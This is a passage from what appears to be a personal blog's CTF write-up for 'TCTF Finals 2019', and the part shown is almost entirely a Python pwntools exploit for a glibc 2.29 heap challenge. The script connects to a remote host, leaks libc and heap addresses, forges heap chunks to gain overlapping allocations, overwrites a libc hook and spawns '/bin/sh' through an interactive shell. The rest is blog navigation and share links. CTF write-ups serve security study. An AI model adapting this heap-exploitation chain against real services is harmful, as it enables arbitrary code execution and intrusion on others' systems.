class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size)</span>:</span></span><br><span class="line">   p.sendlineafter(<span class="string">"Command: "</span>,<span class="string">"1"</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">"Size: "</span>,str(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,size,note)</span>:</span></span><br><span class="line">   p.sendlineafter(<span class="string">"Command: "</span>,<span class="string">"2"</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">"Index: "</span>,str(index))</span><br><span class="line">   p.sendlineafter(<span class="string">"Size: "</span>,str(size))</span><br><span class="line">   p.sendafter(<span class="string">"Content: "</span>,note)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">   p.sendlineafter(<span class="string">"Command: "</span>,<span class="string">"3"</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">"Index: "</span>,str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">   p.sendlineafter(<span class="string">"Command: "</span>,<span class="string">"4"</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">"Index: "</span>,str(index))</span><br><span class="line">   p.recvuntil(<span class="string">"]: "</span>)</span><br><span class="line">   <span class="keyword">return</span> p.recvuntil(<span class="string">"\n"</span>).strip()</span><br><span class="line"><span class="comment">#p=process(["./lib/ld-2.29.so","--library-path","./lib","./babyheap2.29"])</span></span><br><span class="line">p=remote(<span class="string">"192.168.201.21"</span>,<span class="number">1904</span>)</span><br><span class="line"><span class="comment">#leak</span></span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">new(<span class="number">0x18</span>)     </span><br><span class="line">new(<span class="number">0x4f8</span>)</span><br><span class="line">new(<span class="number">0x18</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">new(<span class="number">0x4f8</span>)</span><br><span class="line">libc_addr=u64(show(<span class="number">1</span>)+<span class="string">"\x00\x00"</span>)+<span class="number">0x7ffff7ddb000</span><span class="number">-0x7ffff7fbfca0</span></span><br><span class="line"><span class="keyword">print</span> hex(libc_addr)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">new(<span class="number">0x18</span>)</span><br><span class="line">new(<span class="number">0x18</span>)</span><br><span class="line">heap_addr=u64(show(<span class="number">0</span>)+<span class="string">"\x00\x00"</span>)</span><br><span class="line"><span class="keyword">print</span> hex(heap_addr)</span><br><span class="line">new(<span class="number">0x4f8</span>)<span class="comment">#3</span></span><br><span class="line">new(<span class="number">0x4f8</span>)<span class="comment">#4</span></span><br><span class="line">new(<span class="number">0x18</span>)</span><br><span class="line">edit(<span class="number">3</span>,<span class="number">0x4f8</span>,p64(heap_addr<span class="number">-0x10</span>)+p64(heap_addr+<span class="number">0x510</span>)+p64(<span class="number">0</span>)*<span class="number">156</span>+p64(<span class="number">0x500</span>))</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x8</span>,p64(heap_addr+<span class="number">0x530</span>))</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x10</span>,p64(<span class="number">0</span>)+p64(heap_addr+<span class="number">0x530</span>))</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">new(<span class="number">0x18</span>)<span class="comment">#4</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">4</span>,<span class="number">0x8</span>,p64(libc_addr+<span class="number">0x1e75a8</span>))</span><br><span class="line">new(<span class="number">0x18</span>)<span class="comment">#3</span></span><br><span class="line">new(<span class="number">0x18</span>)<span class="comment">#4</span></span><br><span class="line">edit(<span class="number">6</span>,<span class="number">0x8</span>,p64(libc_addr+<span class="number">0x52fd0</span>))</span><br><span class="line">edit(<span class="number">3</span>,<span class="number">0x8</span>,<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-Embedded-heap"><span class="toc-number">1.</span> <span class="toc-text">0x01 Embedded_heap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Debug"><span class="toc-number">1.1.</span> <span class="toc-text">Debug</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Localhost"><span class="toc-number">1.1.1.</span> <span class="toc-text">Localhost:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Exec-Environment"><span class="toc-number">1.1.2.</span> <span class="toc-text">Exec Environment:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Successful"><span class="toc-number">1.1.3.</span> <span class="toc-text">Successful:</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Analyze"><span class="toc-number">1.2.</span> <span class="toc-text">Analyze</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit"><span class="toc-number">1.3.</span> <span class="toc-text">Exploit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP"><span class="toc-number">1.4.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-babyheap"><span class="toc-number">2.</span> <span class="toc-text">0x02 babyheap</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/06/20/TCTF-Finals-2019-Embedded-heap/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/06/20/TCTF-Finals-2019-Embedded-heap/&text=TCTF Finals 2019 Embedded_heap" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/06/20/TCTF-Finals-2019-Embedded-heap/&title=TCTF Finals 2019 Embedded_heap" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/06/20/TCTF-Finals-2019-Embedded-heap/&is_video=false&description=TCTF Finals 2019 Embedded_heap" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=TCTF Finals 2019 Embedded_heap&body=Check out this article: http://yoursite.com/2019/06/20/TCTF-Finals-2019-Embedded-heap/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/06/20/TCTF-Finals-2019-Embedded-heap/&title=TCTF Finals 2019 Embedded_heap" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/06/20/TCTF-Finals-2019-Embedded-heap/&title=TCTF Finals 2019 Embedded_heap" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/06/20/TCTF-Finals-2019-Embedded-heap/&title=TCTF Finals 2019 Embedded_heap" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/06/20/TCTF-Finals-2019-Embedded-heap/&title=TCTF Finals 2019 Embedded_heap" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/06/20/TCTF-Finals-2019-Embedded-heap/&name=TCTF Finals 2019 Embedded_heap&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2020 Kirin
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
</body>
</html>
<!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


<!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Disqus Comments -->


